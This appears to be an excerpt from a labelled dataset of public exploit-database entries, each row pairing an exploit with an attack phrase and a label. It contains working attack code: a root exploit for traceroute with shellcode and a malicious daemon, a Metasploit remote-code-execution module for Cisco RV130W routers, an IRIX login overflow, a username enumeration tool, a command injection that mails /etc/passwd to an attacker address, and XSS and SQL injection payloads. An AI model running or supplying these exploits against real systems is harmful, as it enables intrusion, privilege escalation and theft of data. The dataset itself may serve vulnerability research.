<netdb.h> #include <malloc.h> #include <stdio.h> #include <string.h> #include <unistd.h> #define _GNU_SOURCE #include <getopt.h>  // Sensible defaults that work on SuSE 7.x & 8.0 (possibly others) #define BUFSIZE 64128 #define RA_SERVER ""localhost"" #define RA_SERVICE ""ap"" #define TRACEROUTE ""/usr/sbin/traceroute"" #define FLAGS ""-nOA"" #define TRACE_HOST ""www.yahoo.com"" #define NOT_SET 0 #define DAEMON 1 #define EXPLOIT 2 #define EXPLOIT_START ""xxxxroute: /1 origin:111"" #define RET_ADDR 0xbfff4444  void do_daemon(char *service); void run_daemon(char *service);  char shellcode[] =         ""\x31\xc0\x31\xdb\xb0\x17\xcd\x80"" // setuid(0)         ""\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b""         ""\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd""         ""\x80\xe8\xdc\xff\xff\xff/bin/sh""; // aleph1 execve() of /bin/sh  char usage[] = ""\ntraceroute-exploit - By Carl Livitt (carl@learningshophull.co.uk)\n"" ""Exploits traceroute-nanog 6.0 -> 6.1.1 and others on SuSE 7.x/8.0\n\n"" ""Usage:\n"" ""      ./traceroute-exploit < -d | -e > [ options ]\n\n"" ""Options:\n"" ""-d             Run in daemon mode (stage 1)\n"" ""-e             Run in exploit mode (stage 2)\n"" ""-h             Display this help\n"" ""-H host        Traceroute to 'host' [www.yahoo.com]\n"" ""-s server      Specify host running exploit daemon [localhost]\n"" ""-S service     Name of service port on exploit daemon host [ap]\n"" ""               ap = port 47806/tcp (see /etc/services)\n"" ""-t filename    Full path to traceroute binary [/usr/sbin/traceroute]\n"" ""-b bufsize     Size of shellcode buffer [64128]\n"" ""-v             Be verbose\n\n"" ""Example (works on SuSE 7.x/8.0):\n"" ""      ./traceroute-exploit -d\n"" ""      ./traceroute-exploit -e\n\n"" ""Example 2 (uses mysql port(3306)):\n"" ""      ./traceroute-exploit -d -S mysql\n"" ""      ./traceroute-exploit -e -S mysql\n\n"";  extern char *optarg; extern int optind, opterr, optopt;  main(int argc, char **argv) {         char *env[4];         char *traceroute[4];         char host[256], server[256], service[256],filename[256];         int bufsize, verbose=0;         int c,exploitMode=NOT_SET;         char *buf;         char tmp[256];  		// some sensible defaults that work out-of-the-box         strncpy(host, TRACE_HOST, 255);         strncpy(server, RA_SERVER, 255);         strncpy(service, RA_SERVICE, 255);         strncpy(filename, TRACEROUTE, 255);         bufsize=BUFSIZE;          // process command-line args 		while((c=getopt(argc,argv,""vdehH:s:S:t:b:""))!=-1) {                 switch(c) {                         case 'd':                                 exploitMode=DAEMON;                                 break;                         case 'e':                                 exploitMode=EXPLOIT;                                 break;                         case 'v':                                 verbose=1;                                 break;                         case 'H':                                 strncpy(host,optarg,255);                                 break;                         case 'h':                                 printf(usage);                                 break;                         case 's':                                 strncpy(server,optarg,255);                                 break;                         case 'S':                                 strncpy(service,optarg,255);                                 break;                         case 't':                                 strncpy(filename,optarg,255);                                 break;                         case 'b':                                 bufsize=atoi(optarg);                                 break;                         default:                                 printf(usage);                                 exit(0);                                 break;                 }         }          		// make sure the attacker knows what he/she/cowboyneal is doing 		if(exploitMode==NOT_SET) {                 printf(""You must specify at least '-d' or '-e'. Type '%s -h' for help.\n"", argv[0]);                 exit(0);         }  		// run the malicious, evil daemon and return the attacker to a shell.         if(exploitMode==DAEMON) {                 // this function will never return. 				do_daemon(service);         }          // Now run traceroute, making it connect to the malicious daemon. 		 		// Allocate our shellcode buffer. 		// This buffer pads the stack by about 64K 		// which makes the off-by-two attack possible 		if((buf=(char *)malloc(bufsize))==NULL) {                 perror(""Out of memory??!??!?!?: "");                 exit(1);         }          // fill buffer with NOPs         memset(buf,(int)0x90,(size_t)bufsize-1);          // start the environment variable         memcpy(buf,""SHELLCODE="",9);          // fill end of buffer with shellcode         memcpy(buf+bufsize-1-strlen(shellcode), shellcode, strlen(shellcode));          // null-terminate         buf[bufsize-1]='\0';          // setup the environment etc 		env[0]=strdup(buf);         sprintf(tmp,""RA_SERVER=%s"",server);env[1]=strdup(tmp);         sprintf(tmp,""RA_SERVICE=%s"",service);env[2]=strdup(tmp);         env[3]=NULL;         sprintf(tmp,""%s"",filename);traceroute[0]=strdup(tmp);         sprintf(tmp,""%s"",FLAGS);traceroute[1]=strdup(tmp);         sprintf(tmp,""%s"",host);traceroute[2]=strdup(tmp);         traceroute[3]=NULL; 		free(buf);          // spawn traceroute and gain r00t in the process...         execve(*traceroute, traceroute, env); }  // fork, making a daemon listing of port 'service' (ap/47806 by default) // and return to shell. void do_daemon(char *service) {         if(fork()==0) {                 run_daemon(service);         } else {                 printf(""Now run this exploit with the '-e' flag.\n"");                 _exit(0);         } }  // the daemon itself void run_daemon(char *service) {         int sock,victim_sock,len,i,j;         struct sockaddr_in server_addr;         struct sockaddr_in victim_addr;         char buf[256];         char exploit_string[4096]=EXPLOIT_START;         struct servent *sv;          // make sure the attacker has specified 		// a valid service name (eg. mysql, ftp, ap etc)		 		if((sv=getservbyname(service,""tcp""))==NULL) {                 perror(""getservbyname(): "");                 exit(0);         }          // some magic-number voodoo...         // exploit_string will cause an off-by-two overflow in get_origin() 		// exploit_string:0   'xxxxroute: /1 origin:111'	# tags used by get_origin() 		// exploit_string:24  'a' x 398						# dummy data 		// exploit_string:422 '\x7f'						# least-significant byte of EBP 		// exploit_string:423 '\x01'						# char < '0' to stop processing 		// exploit_string:424 '\x44\x44\xff\xbb' x 104		# evil EIP containing shellcode 		// exploit_string:528 '\0'							# NULL terminator         memset(exploit_string+24, '\0', 4096-1-24);         memset(exploit_string+24, 'a', 398);         memset(exploit_string+24+398, '\x7f', 1);          // the next byte stops get_origin from processing         // any more of the exploit string.         memset(exploit_string+24+399,'\x01', 4);          // now we can fill buf[256] with our evil EIP         // and bypass the filtering in get_origin(). Yay! 		// More magic numbers...         i=24+399+4;         j=i+416;         while(i<j) {                 exploit_string[i++]=(char)RET_ADDR&0xff;                 exploit_string[i++]=(char)(RET_ADDR>>8)&0xff;                 exploit_string[i++]=(char)(RET_ADDR>>16)&0xff;                 exploit_string[i++]=(char)(RET_ADDR>>24)&0xff;         }          // setup TCP socket 		if((sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))==-1) {                 perror(""socket(): "");                 exit(1);         }         server_addr.sin_family = AF_INET;         server_addr.sin_addr.s_addr = INADDR_ANY;         server_addr.sin_port = sv->s_port;         len=sizeof(server_addr);          if((bind(sock, (struct sockaddr *)&server_addr, len))<0) {                 perror(""bind(): "");                 exit(1);         }         if((listen(sock, 1))!=0) {                 perror(""listen(): "");                 exit(1);         }          		// wait for connect from traceroute... 		victim_sock=accept(sock, (struct sockaddr *)&victim_addr, &len); 		 		// read the IP address that traceroute sends (and ignore it)         read(victim_sock, buf, 255);          		// write exploit string 		write(victim_sock, exploit_string, strlen(exploit_string));          		// so long and thanks for all the fish 		close(victim_sock);         close(sock);         exit(0); }",inject a carefully crafted response to traceroute's query,1
46705,"Cisco RV130W Routers - Management Interface Remote Command Execution (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  # linux/armle/meterpreter/bind_tcp -> segfault # linux/armle/meterpreter/reverse_tcp -> segfault # linux/armle/meterpreter_reverse_http -> works # linux/armle/meterpreter_reverse_https -> works # linux/armle/meterpreter_reverse_tcp -> works # linux/armle/shell/bind_tcp -> segfault # linux/armle/shell/reverse_tcp -> segfault # linux/armle/shell_bind_tcp -> segfault # linux/armle/shell_reverse_tcp -> segfault # class MetasploitModule < Msf::Exploit::Remote   Rank = GoodRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::CmdStager    def initialize(info = {})     super(update_info(info,       'Name'           => 'Cisco RV130W Routers Management Interface Remote Command Execution',       'Description'    => %q{         A vulnerability in the web-based management interface of the Cisco RV130W Wireless-N Multifunction VPN Router          could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device.           The vulnerability is due to improper validation of user-supplied data in the web-based management interface.          An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device.           A successful exploit could allow the attacker to execute arbitrary code on the underlying operating           system of the affected device as a high-privilege user.          RV130W Wireless-N Multifunction VPN Router versions prior to 1.0.3.45 are affected.          Note: successful exploitation may not result in a session, and as such,          on_new_session will never repair the HTTP server, leading to a denial-of-service condition.       },       'Author'         =>         [           'Yu Zhang', # Initial discovery           'Haoliang Lu', # Initial discovery           'T. Shiomitsu', # Initial discovery           'Quentin Kaiser <kaiserquentin@gmail.com>' # Vulnerability analysis & exploit dev         ],       'License'         => MSF_LICENSE,       'Platform'        =>  %w[linux],       'Arch'            =>  [ARCH_ARMLE],       'SessionTypes'    =>  %w[meterpreter],       'CmdStagerFlavor' => %w{ wget },       'Privileged'      => true, # BusyBox       'References'      =>         [           ['CVE', '2019-1663'],           ['BID', '107185'],           ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190227-rmi-cmd-ex'],         ],       'DefaultOptions' => {           'WfsDelay' => 10,           'SSL' => true,           'RPORT' => 443,           'CMDSTAGER::FLAVOR' => 'wget',           'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp',        },       'Targets'        =>         [           [ 'Cisco RV130/RV130W < 1.0.3.45',             {               'offset'          => 446,               'libc_base_addr'  => 0x357fb000,               'system_offset'   => 0x0004d144,               'gadget1'         => 0x00020e79, # pop {r2, r6, pc};               'gadget2'         => 0x00041308, # mov r0, sp; blx r2;               'Arch'            => ARCH_ARMLE,             }           ],         ],       'DisclosureDate'  => 'Feb 27 2019',       'DefaultTarget'   => 0,       'Notes' => {         'Stability'   => [ CRASH_SERVICE_DOWN, ],       },     ))   end    def p(offset)     [(target['libc_base_addr'] + offset).to_s(16)].pack('H*').reverse   end    def prepare_shellcode(cmd)     #All these gadgets are from /lib/libc.so.0     shellcode = rand_text_alpha(target['offset']) +       # filler       p(target['gadget1']) +       p(target['system_offset']) +                        # r2       rand_text_alpha(4) +                                # r6       p(target['gadget2']) +                              # pc       cmd     shellcode   end    def send_request(buffer)     begin       send_request_cgi({         'uri'     => '/login.cgi',         'method'  => 'POST',         'vars_post' => {               ""submit_button"": ""login"",               ""submit_type"": """",               ""gui_action"": """",               ""wait_time"": 0,               ""change_action"": """",               ""enc"": 1,               ""user"": rand_text_alpha_lower(5),               ""pwd"": buffer,               ""sel_lang"": ""EN""           }       })     rescue ::Rex::ConnectionError       fail_with(Failure::Unreachable, ""#{peer} - Failed to connect to the router"")     end   end    def exploit     print_status('Sending request')     execute_cmdstager   end    def execute_command(cmd, opts = {})     shellcode = prepare_shellcode(cmd.to_s)     send_request(shellcode)   end    def on_new_session(session)     # Given there is no process continuation here, the httpd server will stop     # functioning properly and we need to take care of proper restart     # ourselves.     print_status(""Reloading httpd service"")     reload_httpd_service = ""killall httpd && cd /www && httpd && httpd -S""     if session.type.to_s.eql? 'meterpreter'       session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'       session.sys.process.execute '/bin/sh', ""-c \""#{reload_httpd_service}\""""     else       session.shell_command(reload_httpd_service)     end   ensure     super   end end",sending malicious HTTP requests to a targeted device,1
42436,"DALIM SOFTWARE ES Core 5.0 build 7184.1 - User Enumeration #!/usr/bin/env python # # # DALIM SOFTWARE ES Core 5.0 build 7184.1 User Enumeration Weakness # # # Vendor: Dalim Software GmbH # Product web page: https://www.dalim.com # Affected version: ES/ESPRiT 5.0 (build 7184.1) #                                 (build 7163.2) #                                 (build 7163.0) #                                 (build 7135.0) #                                 (build 7114.1) #                                 (build 7114.0) #                                 (build 7093.1) #                                 (build 7093.0) #                                 (build 7072.0) #                                 (build 7051.3) #                                 (build 7051.1) #                                 (build 7030.0) #                                 (build 7009.0) #                                 (build 6347.0) #                                 (build 6326.0) #                                 (build 6305.1) #                                 (build 6235.9) #                                 (build 6172.1) #                   ES/ESPRiT 4.5 (build 6326.0) #                                 (build 6144.2) #                                 (build 5180.2) #                                 (build 5096.0) #                                 (build 4314.3) #                                 (build 4314.0) #                                 (build 4146.4) #                                 (build 3308.3) #                   ES/ESPRiT 4.0 (build 4202.0) #                                 (build 4132.1) #                                 (build 2235.0) #                   ES/ESPRiT 3.0 # # Summary: ES is the new Enterprise Solution from DALIM SOFTWARE built # from the successful TWIST, DIALOGUE and MISTRAL product lines. The ES # Core is the engine that can handle project tracking, JDF device workflow, # dynamic user interface building, volume management. Each ES installation # will have different features, depending on the license installed: online # approval, prepress workflow, project tracking, imposition management... # # ES is a collaborative digital asset production and management platform, # offering services ranging from online approval to web-based production # environment for all participants of the production cycle, including brand # owners, agencies, publishers, pre-media, printers and multichannel service # provider. ES lets users plan, execute and control any aspect of media # production, regardless of the final use of the output (print, web, ebook, # movie, and others). It ensures productivity and longterm profitability. # # Desc: The weakness is caused due to the 'Login.jsp' script enumerating # the list of valid usernames when some characters are provided via the # 'login' parameter. # # Tested on: Red Hat Enterprise Linux Server release 7.3 (Maipo) #            CentOS 7 #            Apache Tomcat/7.0.78 #            Apache Tomcat/7.0.67 #            Apache Tomcat/7.0.42 #            Apache Tomcat/6.0.35 #            Apache-Coyote/1.1 #            Java/1.7.0_80 #            Java/1.6.0_21 # # # Vulnerability discovered by Gjoko 'LiquidWorm' Krstic #                             @zeroscience # # # Advisory ID: ZSL-2017-5425 # Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5425.php # # # 15.06.2017 #   import argparse import requests import sys  from colorama import Fore, Back, Style, init  init()  print 'User Enumeration Tool v0.3 for DALiM ES <= v5.0' parser = argparse.ArgumentParser() parser.add_argument('-t', help='target IP or hostname', action='store', dest='target') parser.add_argument('-f', help='username wordlist', action='store', dest='file')  args = parser.parse_args() if len(sys.argv) != 5: 	parser.print_help() 	sys.exit()  host = args.target fn = args.file  try: 	users = open(args.file, 'r') except(IOError): 	print '[!] Error opening \'' +fn+ '\' file.' 	sys.exit() lines = users.read().splitlines() print '[*] Loaded %d usernames for testing.\n' % len(open(fn).readlines()) users.close() results = open('validusers.txt', 'w')  for line in lines: 	try: 		r = requests.post(""http://"" +host+ ""/Esprit/public/Login.jsp"", data={'actionRole' : 'getRoles', 'login' : line}) 		print '[+] Testing username: ' +Fore.GREEN+line+Fore.RESET 		testingus = r.text[50:72] 		if testingus[19:20] != ""\"""": 			print '[!] Found ' +Style.BRIGHT+Fore.RED+line+Fore.RESET+Style.RESET_ALL+ ' as valid registered user.' 			results.write('%s\n' % line) 	except: 		print '[!] Error connecting to http://'+host 		sys.exit()  results.close() print '\n[*] Enumeration completed!' print '[*] Valid usernames successfully written to \'validusers.txt\' file.\n'",a specially crafted .jsp file,1
19310,"SGI IRIX 6.4 - 'login' Local Privilege Escalation /* source: https://www.securityfocus.com/bid/392/info  A buffer overflow exists in the /bin/login program supplied by Silicon Graphics, as part of their Irix operating system. By supplying a carefully crafted, log buffer to the -h option of login, a local user can obtain root privileges. */  /* /bin/login exploit by DCRH 24/5/97  *  * Tested on:   R3000 Indigo (Irix 5.3)  *              R4400 Indy (Irix 5.3)  *              R5000 O2 (Irix 6.3)  *              R8000 Power Challenge (Irix 6.2)  *  * Compile as: cc -n32 login.c     (for Irix 6.x)  *             cc login.c          (for Irix 5.x)  *  * Press enter when prompted for a password  *  */  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/types.h> #include <unistd.h>  #define BUF_LENGTH      200 #define EXTRA           300 #define OFFSET          0x1b0 #define IRIX_NOP        0x03e0f825    /* move $ra,$ra */  #define u_long unsigned   u_long get_sp_code[] = {     0x03a01025,         /* move $v0,$sp         */     0x03e00008,         /* jr $ra               */     0x00000000,         /* nop                  */ };  u_long irix_shellcode[] = {     0x24041234,         /* li $4,0x1234         */     0x2084edcc,         /* sub $4,0x1234        */     0x0491fffe,         /* bgezal $4,pc-4       */     0x03bd302a,         /* sgt $6,$sp,$sp       */     0x23e4012c,         /* addi $4,$31,264+36   */     0xa086feff,         /* sb $6,-264+7($4)     */     0x2084fef8,         /* sub $4,264           */     0x20850110,         /* addi $5,$4,264+8     */     0xaca4fef8,         /* sw $4,-264($5)       */     0xaca6fefc,         /* sw $4,-260($5)       */     0x20a5fef8,         /* sub $5, 264          */     0x240203f3,         /* li $v0,1011          */     0x03ffffcc,         /* syscall 0xfffff      */     0x2f62696e,         /* ""/bin""               */     0x2f7368ff,         /* ""/sh""                */ };  char buf[BUF_LENGTH + EXTRA + 8];  void main(int argc, char **argv) {     char *env[] = {NULL};     u_long targ_addr, stack;     u_long *long_p;     int i, code_length = strlen((char *)irix_shellcode)+1;     u_long (*get_sp)(void) = (u_long (*)(void))get_sp_code;      stack = get_sp();      long_p =(u_long *)  buf;     targ_addr = stack + OFFSET;      if (argc > 1)       targ_addr += atoi(argv[1]);      while ((targ_addr & 0xff000000) == 0 ||            (targ_addr & 0x00ff0000) == 0 ||            (targ_addr & 0x0000ff00) == 0 ||            (targ_addr & 0x000000ff) == 0)       targ_addr += 4;      for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)         *long_p++ = IRIX_NOP;      for (i = 0; i < code_length/sizeof(u_long); i++)         *long_p++ = irix_shellcode[i];      for (i = 0; i < EXTRA / sizeof(u_long); i++)         *long_p++ = (targ_addr << 24) | (targ_addr >> 8);      *long_p = 0;      printf(""stack = 0x%x, targ_addr = 0x%x\n"", stack, targ_addr);      execle(""/bin/login"", ""login"", ""-h"", &buf[1], 0, env);     perror(""execl failed""); }","supplying a carefully crafted, log buffer to the -h option of login",1
20524,"Brian Stanback bsguest.cgi 1.0 - Remote Command Execution source: https://www.securityfocus.com/bid/2159/info  An input validation vulnerability exists in Brian Stanback's bsguest.cgi, a script designed to coordinate guestbook submissions from website visitors.  The script fails to properly filter ';' characters from the user-supplied email address collected by the script.  As a result, maliciously-formed values for this field can cause the the script to run arbitrary shell commands with the privilege level of the web server.   Attacker enters his email address as <whitehatjoe@hotmail.com>  'hacker@example.com;/usr/sbin/sendmail hacker@example.com < /etc/passwd',  server mails a confirmation letter along with the passwd file to the attacker.",maliciously-formed values for this field can cause the the script to run arbitrary shell commands with the privilege level of the web server,1
20474,"WordPress Plugin RSVPMaker 2.5.4 - Persistent Cross-Site Scripting # Exploit Title: WordPress RSVPMaker v2.5.4 Persistent XSS # Date: 8/12/12 # Exploit Author: Chris Kellum # Vendor Homepage: http://rsvpmaker.com/ # Software Link: http://downloads.wordpress.org/plugin/rsvpmaker.zip # Version: 2.5.4    ===================== Vulnerability Details =====================  The RSVP form does not properly sanitize input fields, allowing for XSS.       Example:            <script>alert(/xss/)</script>  Plugin appears to escape apostrophes and quotes, but this can easily be circumvented.  XSS will fire when the admin views the event's attendance list in the RSVP report section.  =================== Disclosure Timeline ===================  8/4/12 - Vulnerability discovered. 8/4/12 - Vendor notified. 8/10/12 - Version 2.5.5 released. 8/12/12 - Public disclosure.",malicious script code,1
26048,Easypx41 - Multiple Variable Injection Vulnerabilities source: https://www.securityfocus.com/bid/14421/info  Easypx41 is prone to multiple variable injection vulnerabilities.  An attacker can manipulate multiple script input variables and bypass access controls to retrieve sensitive and privileged information. Information obtained may aid in further attacks against the vulnerable application or the underlying system.  http://www.example.com/index.php?pg=&L=[variable-injection]&H=[variable-injection] http://www.example.com/index.php?pg=modules/forum/viewtopic.php&Forum=Forum%20de%20d?monstration.&msg=1103495330.dat&pgfull[variable-injection] http://www.example.com/index.php?pg=http://google.fr&pgtype=iframe&amp;amp;L=500&H=500 http://www.example.com/index.php?pg=modules/forum/viewprofil.php&membres=[variable-injection]&pgfull[variable-injection] http://www.example.com/index.php?pg=modules/forum/viewprofil.php&membres=[variable-injection] http://www.example.com/index.php?pg=modules/forum/viewtopic.php&Forum=[change-or-variable-injection].&msg=1103495330.dat&pgfull,manipulate multiple script input variables,1
36643,"4Images 1.7.10 - '/admin/categories.php?cat_parent_id' SQL Injection source: https://www.securityfocus.com/bid/51774/info  4images is prone to multiple input-validation vulnerabilities including:  1. A cross-site scripting vulnerability. 2. An open-redirection vulnerability. 3. An SQL-injection vulnerability.  An attacker may leverage these issues to perform spoofing and phishing attacks, to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database and execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.  4images 1.7.10 is vulnerable; other versions may also be affected.   http://www.example.com/admin/categories.php?action=addcat&cat_parent_id=1' (SQL Injection)",perform spoofing and phishing attacks,1
15897,"Music Animation Machine MIDI Player - Local Crash (PoC) # Exploit Title: Music Animation Machine MIDI Player Local Crash PoC # Date: 1/3/2011 # Author: c0d3R'Z # Software Link: http://www.musanim.com/player/MAMPlayer2006aug19_035.zip # Version: Release 035 # Tested on: Windows XP SP2 EN (VirtualBox)    # The application crashes when trys to convert a malformed midi file   #!/usr/bin/python   buffer     = ""\x31\x33\x33\x37"" * 1337   try:     f = open(""test.mid"",'w')     f.write(buffer)     f.close()       print "" Vulnerable file created!...""     print "" Open the mid file with the application and Voila!! , it crashes!!\n"" except:     print ""[-] Error occured!""",a malformed midi file,1
38999,"Wireshark - dissect_nbap_MACdPDU_Size SIGSEGV Source: https://code.google.com/p/google-security-research/issues/detail?id=652  The following SIGSEGV crash due to an invalid memory read can be observed in an ASAN build of Wireshark (current git master), by feeding a malformed file to tshark (""$ ./tshark -nVxr /path/to/file""):  --- cut --- ==31034==ERROR: AddressSanitizer: SEGV on unknown address 0x7fc24e20fa84 (pc 0x7fbe445bb082 bp 0x7fff030fefb0 sp 0x7fff030fef00 T0)     #0 0x7fbe445bb081 in dissect_nbap_MACdPDU_Size wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:1622:79     #1 0x7fbe433ceb56 in dissect_per_sequence wireshark/epan/dissectors/packet-per.c:1866:12     #2 0x7fbe445c760d in dissect_nbap_HSDSCH_Initial_Capacity_AllocationItem wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:1650:12     #3 0x7fbe433b2fa3 in dissect_per_sequence_of_helper wireshark/epan/dissectors/packet-per.c:531:10     #4 0x7fbe433be23b in dissect_per_constrained_sequence_of wireshark/epan/dissectors/packet-per.c:905:9     #5 0x7fbe445c7569 in dissect_nbap_HSDSCH_Initial_Capacity_Allocation wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:1663:12     #6 0x7fbe433ceb56 in dissect_per_sequence wireshark/epan/dissectors/packet-per.c:1866:12     #7 0x7fbe445da43d in dissect_nbap_CommonMACFlow_Specific_InfoItem_Response wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:1682:12     #8 0x7fbe433b2fa3 in dissect_per_sequence_of_helper wireshark/epan/dissectors/packet-per.c:531:10     #9 0x7fbe433be23b in dissect_per_constrained_sequence_of wireshark/epan/dissectors/packet-per.c:905:9     #10 0x7fbe445da399 in dissect_nbap_CommonMACFlow_Specific_InfoList_Response wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:1695:12     #11 0x7fbe433ceb56 in dissect_per_sequence wireshark/epan/dissectors/packet-per.c:1866:12     #12 0x7fbe445da2bd in dissect_nbap_HSDSCH_Common_System_Information_ResponseFDD wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:2120:12     #13 0x7fbe44546230 in dissect_HSDSCH_Common_System_Information_ResponseFDD_PDU wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:2430:12     #14 0x7fbe41b43cc1 in call_dissector_through_handle wireshark/epan/packet.c:616:8     #15 0x7fbe41b365ea in call_dissector_work wireshark/epan/packet.c:691:9     #16 0x7fbe41b35dbd in dissector_try_uint_new wireshark/epan/packet.c:1148:9     #17 0x7fbe4456f40e in dissect_ProtocolExtensionFieldExtensionValue wireshark/epan/dissectors/../../asn1/nbap/packet-nbap-template.c:320:11     #18 0x7fbe433addf0 in dissect_per_open_type_internal wireshark/epan/dissectors/packet-per.c:242:5     #19 0x7fbe433ae10d in dissect_per_open_type_pdu_new wireshark/epan/dissectors/packet-per.c:263:9     #20 0x7fbe4456f370 in dissect_nbap_T_extensionValue wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:200:12     #21 0x7fbe433ceb56 in dissect_per_sequence wireshark/epan/dissectors/packet-per.c:1866:12     #22 0x7fbe4456f12d in dissect_nbap_ProtocolExtensionField wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:215:12     #23 0x7fbe433b2fa3 in dissect_per_sequence_of_helper wireshark/epan/dissectors/packet-per.c:531:10     #24 0x7fbe433be23b in dissect_per_constrained_sequence_of wireshark/epan/dissectors/packet-per.c:905:9     #25 0x7fbe4456ef09 in dissect_nbap_ProtocolExtensionContainer wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:228:12     #26 0x7fbe433ceb56 in dissect_per_sequence wireshark/epan/dissectors/packet-per.c:1866:12     #27 0x7fbe445f23bf in dissect_nbap_CommonMeasurementInitiationRequest wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:263:12     #28 0x7fbe445644d0 in dissect_CommonMeasurementInitiationRequest_PDU wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:5030:12     #29 0x7fbe41b43cc1 in call_dissector_through_handle wireshark/epan/packet.c:616:8     #30 0x7fbe41b365ea in call_dissector_work wireshark/epan/packet.c:691:9     #31 0x7fbe41b3802d in dissector_try_string wireshark/epan/packet.c:1443:9     #32 0x7fbe4456e3ce in dissect_InitiatingMessageValue wireshark/epan/dissectors/../../asn1/nbap/packet-nbap-template.c:326:11     #33 0x7fbe433addf0 in dissect_per_open_type_internal wireshark/epan/dissectors/packet-per.c:242:5     #34 0x7fbe433ae10d in dissect_per_open_type_pdu_new wireshark/epan/dissectors/packet-per.c:263:9     #35 0x7fbe4456df10 in dissect_nbap_InitiatingMessage_value wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:702:12     #36 0x7fbe433ceb56 in dissect_per_sequence wireshark/epan/dissectors/packet-per.c:1866:12     #37 0x7fbe4456d91d in dissect_nbap_InitiatingMessage wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:719:12     #38 0x7fbe433cc861 in dissect_per_choice wireshark/epan/dissectors/packet-per.c:1714:13     #39 0x7fbe4456d881 in dissect_nbap_NBAP_PDU wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:825:12     #40 0x7fbe4456d740 in dissect_NBAP_PDU_PDU wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:8430:12     #41 0x7fbe444e889b in dissect_nbap wireshark/epan/dissectors/../../asn1/nbap/packet-nbap-template.c:457:9     #42 0x7fbe41b43cc1 in call_dissector_through_handle wireshark/epan/packet.c:616:8     #43 0x7fbe41b365ea in call_dissector_work wireshark/epan/packet.c:691:9     #44 0x7fbe41b35dbd in dissector_try_uint_new wireshark/epan/packet.c:1148:9     #45 0x7fbe4378f98b in dissect_payload wireshark/epan/dissectors/packet-sctp.c:2517:9     #46 0x7fbe43786b88 in dissect_data_chunk wireshark/epan/dissectors/packet-sctp.c:3443:16     #47 0x7fbe4377fd99 in dissect_sctp_chunk wireshark/epan/dissectors/packet-sctp.c:4360:14     #48 0x7fbe4377cd03 in dissect_sctp_chunks wireshark/epan/dissectors/packet-sctp.c:4515:9     #49 0x7fbe4377acdf in dissect_sctp_packet wireshark/epan/dissectors/packet-sctp.c:4678:3     #50 0x7fbe43778cba in dissect_sctp wireshark/epan/dissectors/packet-sctp.c:4732:3     #51 0x7fbe41b43cc1 in call_dissector_through_handle wireshark/epan/packet.c:616:8     #52 0x7fbe41b365ea in call_dissector_work wireshark/epan/packet.c:691:9     #53 0x7fbe41b35dbd in dissector_try_uint_new wireshark/epan/packet.c:1148:9     #54 0x7fbe428455f6 in dissect_frame wireshark/epan/dissectors/packet-frame.c:500:11     #55 0x7fbe41b43cc1 in call_dissector_through_handle wireshark/epan/packet.c:616:8     #56 0x7fbe41b365ea in call_dissector_work wireshark/epan/packet.c:691:9     #57 0x7fbe41b402be in call_dissector_only wireshark/epan/packet.c:2662:8     #58 0x7fbe41b31ccf in call_dissector_with_data wireshark/epan/packet.c:2675:8     #59 0x7fbe41b3133b in dissect_record wireshark/epan/packet.c:501:3     #60 0x7fbe41adf3c9 in epan_dissect_run_with_taps wireshark/epan/epan.c:373:2     #61 0x5264eb in process_packet wireshark/tshark.c:3728:5     #62 0x51f960 in load_cap_file wireshark/tshark.c:3484:11     #63 0x515daf in main wireshark/tshark.c:2197:13  AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV wireshark/epan/dissectors/../../asn1/nbap/nbap.cnf:1622:79 in dissect_nbap_MACdPDU_Size ==31034==ABORTING --- cut ---  The crash was reported at https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=11815. Attached are three files which trigger the crash.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/38999.zip",feeding a malformed file to tshark,1
40956,"Apple macOS < 10.12.2 / iOS < 10.2 - '_kernelrpc_mach_port_insert_right_trap' Kernel Reference Count Leak / Use-After-Free /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=941  Proofs of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40956.zip  The previous ref count overflow bugs were all kinda slow because they were quite deep in kernel code, a lot of mach message and MIG code had to run for each leak.  There are a handful of mach operations which have their own fast-path syscalls (mach traps.) One of these is _kernelrpc_mach_port_insert_right_trap which lets us create a new mach port name in our process from a port we already have. Here's the code:    int   _kernelrpc_mach_port_insert_right_trap(struct _kernelrpc_mach_port_insert_right_args *args)   {     task_t task = port_name_to_task(args->target);     ipc_port_t port;     mach_msg_type_name_t disp;     int rv = MACH_SEND_INVALID_DEST;      if (task != current_task())       goto done;      rv = ipc_object_copyin(task->itk_space, args->poly, args->polyPoly,         